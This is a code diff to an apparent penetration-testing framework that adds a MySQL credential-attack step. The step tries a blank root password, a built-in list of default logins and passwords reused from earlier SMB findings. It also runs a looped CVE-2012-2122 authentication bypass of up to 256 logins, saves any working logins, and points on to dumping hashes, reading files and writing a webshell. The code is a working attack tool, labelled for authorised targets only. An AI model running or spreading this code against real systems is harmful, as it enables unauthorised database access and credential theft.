@@ -2290,6 +2290,18 @@ def _extract_finding(sid: str, output: str) -> "dict | None":
                     "summary": f"telnet foothold — {mm.group(1).strip()}"[:140]}
         return None
 
+    # 2bi) mysql-creds: default/reused login or CVE-2012-2122 bypass → DB access
+    if sid == "mysql-creds":
+        if re.search(r"^✗ BYPASS ", output, re.M):
+            return {"state": "VULNERABLE", "cve": "CVE-2012-2122", "risk": "CRITICAL",
+                    "summary": "MySQL auth bypass (CVE-2012-2122) — root without a password"[:140]}
+        hits = re.findall(r"^✗ CREDS (.+)$", output, re.M)
+        if not hits:
+            return None
+        shown = "; ".join(h.strip() for h in hits[:3]) + (f" +{len(hits) - 3}" if len(hits) > 3 else "")
+        return {"state": "VULNERABLE", "cve": cve, "risk": "HIGH",
+                "summary": f"MySQL creds: {shown}"[:140]}
+
     # 2bh) mysql-banner: unauthenticated version disclosure (info)
     if sid == "mysql-banner":
         mv = re.search(r"^\[\*\] Service:\s*(.+)$", output, re.M)
@@ -3332,7 +3344,7 @@ _EXPLOIT_STEPS = {
     ],
     "mysql": [
         ("Banner: handshake → version + auth plugin → searchsploit", "mysql-banner"),
-        "Try root with no password, then default / reused creds",
+        ("Root no-pass + default / reused creds; CVE-2012-2122 bypass on old 5.x", "mysql-creds"),
         "Enumerate databases & users; dump app creds & password hashes",
         "Read local files with LOAD_FILE (needs FILE priv / secure_file_priv)",
         "Write a webshell with INTO OUTFILE into a writable web root",
@@ -12627,6 +12639,135 @@ def _tool_mysql_banner(ip: str, port: int, proto: str) -> str:
     return f"MySQL banner — {ip}:{port}\n\n" + "\n".join(lines)
 
 
+# ── MySQL step 2: root no-pass + default / reused creds; CVE-2012-2122 bypass on old 5.x ──
+_MYSQLCREDS_DEADLINE = 120
+_MYSQLCREDS_MAX = 60
+_MYSQL_BYPASS_TRIES = 256        # CVE-2012-2122: ~1/256 wrong-password auths slip through
+_MYSQL_DEFAULTS = [
+    ("root", ""), ("root", "root"), ("root", "toor"), ("root", "mysql"), ("root", "password"),
+    ("root", "admin"), ("root", "123456"), ("root", "P@ssw0rd"), ("admin", "admin"),
+    ("mysql", "mysql"), ("user", "user"), ("test", "test"), ("dbuser", "dbuser"), ("web", "web"),
+]
+
+
+def _mysql_query(ip: str, port: int, user: str, pw: str, sql: str, timeout: int = 15) -> tuple:
+    """Run a SQL query via the mysql/mariadb CLI. Returns (rc, output) or (None, '') if no client.
+    rc 0 = success; access-denied / errors set rc != 0."""
+    exe = shutil.which("mysql") or shutil.which("mariadb")
+    if not exe:
+        return (None, "")
+    try:
+        p = subprocess.run([exe, "-h", ip, "-P", str(port), "-u", user, f"--password={pw}",
+                            "--connect-timeout=6", "--protocol=TCP", "-N", "-B", "-e", sql],
+                           capture_output=True, text=True, timeout=timeout)
+        return (p.returncode, (p.stdout or "") + (p.stderr or ""))
+    except (OSError, subprocess.SubprocessError):
+        return (None, "")
+
+
+def _mysql_auth_nxc(ip: str, port: int, user: str, pw: str) -> "bool | None":
+    """Auth check via netexec mysql (fallback when no CLI). True/False, or None if netexec absent."""
+    nxc = shutil.which("netexec") or shutil.which("nxc")
+    if not nxc:
+        return None
+    try:
+        p = subprocess.run([nxc, "mysql", ip, "--port", str(port), "-u", user, "-p", pw],
+                           capture_output=True, text=True, timeout=40)
+        out = re.sub(r"\x1b\[[0-9;]*m", "", (p.stdout or "") + (p.stderr or ""))
+    except (OSError, subprocess.SubprocessError):
+        return None
+    return bool(re.search(r"\bMYSQL\b.*\[\+\]", out))
+
+
+def _mysql_auth(ip: str, port: int, user: str, pw: str) -> bool:
+    """True when (user, pw) authenticates — mysql CLI first, netexec fallback."""
+    rc, out = _mysql_query(ip, port, user, pw, "SELECT 1")
+    if rc is not None:
+        return rc == 0 and "access denied" not in out.lower()
+    return bool(_mysql_auth_nxc(ip, port, user, pw))
+
+
+def _gather_mysql_creds(ip: str) -> list:
+    """(user, pass) MySQL logins mysql-creds proved for this host ('mysql on <ip>')."""
+    out = []
+    for sid, output in fetch_scripts(ip, 445, "tcp"):
+        if sid != "smb-creds":
+            continue
+        for m in re.finditer(rf"! (\S+?):(\S*) @ mysql on {re.escape(ip)}\b", output or ""):
+            out.append((m.group(1), "" if m.group(2) == "<blank>" else m.group(2)))
+    return out
+
+
+def _tool_mysql_creds(ip: str, port: int, proto: str) -> str:
+    """MySQL step 2 tool: try root with no password plus a curated set of default MySQL creds and
+    any harvested password (reuse across services) via the mysql/mariadb CLI (netexec fallback) —
+    targeted, NOT a wordlist brute. When mysql-banner flagged an old 5.x build, also run the
+    CVE-2012-2122 auth-bypass (repeated wrong-password logins; ~1/256 slip through). Valid logins
+    are saved to the store ('mysql on <host>'). No client/netexec → raises. Authorised only."""
+    import time
+    if not (shutil.which("mysql") or shutil.which("mariadb")
+            or shutil.which("netexec") or shutil.which("nxc")):
+        raise RuntimeError("need a mysql/mariadb client or netexec to test MySQL creds")
+
+    reused = [(u, s) for _d, u, s in _gather_all_smb_creds()
+              if s and not re.fullmatch(r"[a-fA-F0-9]{32}", s)]
+    candidates, seen = [], set()
+    for u, p in _MYSQL_DEFAULTS + reused:
+        key = (u.lower(), p)
+        if key not in seen:
+            seen.add(key)
+            candidates.append((u, p, (u, p) not in _MYSQL_DEFAULTS))
+    candidates = candidates[:_MYSQLCREDS_MAX]
+
+    deadline = time.time() + _MYSQLCREDS_DEADLINE
+    valid = []
+    for user, pw, is_reused in candidates:
+        if time.time() > deadline:
+            break
+        if _mysql_auth(ip, port, user, pw):
+            valid.append((user, pw, is_reused))
+            break                                            # one working login is enough
+
+    bypass = False
+    banner = next((o for s, o in fetch_scripts(ip, port, proto) if s == "mysql-banner"), "")
+    if not valid and "auth-bypass" in banner and (shutil.which("mysql") or shutil.which("mariadb")):
+        for _ in range(_MYSQL_BYPASS_TRIES):
+            if time.time() > deadline:
+                break
+            rc, out = _mysql_query(ip, port, "root", "wrongpw_pshunter", "SELECT 1", timeout=8)
+            if rc == 0:
+                bypass = True
+                valid.append(("root", "", False))
+                break
+            if rc is None or "is blocked" in out.lower():    # max_connect_errors tripped → stop
+                break
+
+    if valid:                                                # persist to the canonical creds store
+        blocks = _load_manual_block(ip, 445, "tcp", "smb-creds")
+        for user, pw, _r in valid:
+            line = f"! {user}:{pw or '<blank>'} @ mysql on {ip} [{ip}]"
+            blocks.setdefault(ip, [])
+            if line not in blocks[ip]:
+                blocks[ip].append(line)
+        _save_manual_block(ip, 445, "tcp", "smb-creds", blocks)
+
+    lines = [f"[*] {len(candidates)} cred(s) tried (defaults + reuse)"
+             + (f" + {_MYSQL_BYPASS_TRIES}-try auth-bypass" if "auth-bypass" in banner else "")
+             + f" · {len(valid)} valid"]
+    if bypass:
+        lines.append("✗ BYPASS root (CVE-2012-2122 auth bypass — no password needed)")
+    for user, pw, is_reused in valid:
+        if bypass and user == "root":
+            continue
+        lines.append(f"✗ CREDS {user}:{pw or '<blank>'}" + ("  (reused)" if is_reused else ""))
+    if valid:
+        lines.append("· loot it (r3) → dump users/hashes, LOAD_FILE, then RCE (r4)")
+    else:
+        lines.append("· no default/reused login worked"
+                     + ("" if "auth-bypass" in banner else " — old 5.x? re-run mysql-banner (r1)"))
+    return f"MySQL credentials — {ip}:{port}\n\n" + "\n".join(lines)
+
+
 # ══ Privilege Escalation phase 1: spawn a shell ══ one place to land a foothold, whatever the
 # service surfaced. A router: it detects which of this host's services have a viable path to a
 # shell (from findings already in the DB) and dispatches to that service's existing foothold tool
@@ -12766,6 +12907,7 @@ _STEP_TOOLS = {
     "telnet-sniff": ("passive cleartext-cred sniff on TCP/23 (raw socket, root, timed)", _tool_telnet_sniff),
     "telnet-next": ("manual telnet steps (context-aware, reference only)", _tool_telnet_next),
     "mysql-banner": ("MySQL/MariaDB handshake → version + auth plugin → searchsploit (stdlib)", _tool_mysql_banner),
+    "mysql-creds": ("root no-pass + default/reused creds; CVE-2012-2122 bypass (mysql CLI / netexec)", _tool_mysql_creds),
     "spawn-shell": ("spawn a shell — router across all service footholds (interactive)", _tool_spawn_shell),
 }
 
@@ -12849,6 +12991,7 @@ _STEP_TOOL_RUNS = {
     "telnet-sniff":     ("Python (raw AF_PACKET)", f"{_mins(_TELNETSNIFF_DEADLINE)} min"),
     "telnet-next":      ("reference · no scan", None),
     "mysql-banner":     ("Python (stdlib) + searchsploit", None),
+    "mysql-creds":      ("mysql CLI / netexec", f"{_mins(_MYSQLCREDS_DEADLINE)} min"),
     "spawn-shell":      ("router → service foothold", None),
 }
 
@@ -13031,6 +13174,11 @@ def _run_step_tool(ip: str, target: tuple, n: int) -> None:
         print(f"{YELLOW}   ⚠ WRITES to the target{RESET}{DIM} — uploads a throwaway {BOLD}~pshw_*{RESET}"
               f"{DIM} via WRQ, reads it back, then blanks it to 0 bytes. "
               f"{RESET}{YELLOW}TFTP has no DELETE — the file stays; clean up manually{RESET}"
+              f"{DIM} · authorised targets only{RESET}")
+    if tool_key == "mysql-creds":                 # targeted creds; bypass loop only when flagged
+        print(f"{DIM}   targeted default/reused logins via mysql CLI / netexec (not a wordlist brute). "
+              f"{RESET}{YELLOW}if mysql-banner flagged old 5.x, it runs the CVE-2012-2122 bypass "
+              f"(~256 rapid logins — may trip max_connect_errors / block the host){RESET}"
               f"{DIM} · authorised targets only{RESET}")
     if tool_key == "telnet-sniff":                # passive capture — root; MITM stays manual
         print(f"{YELLOW}   ⚠ passive capture (needs root){RESET}{DIM} — sniffs cleartext telnet on the "
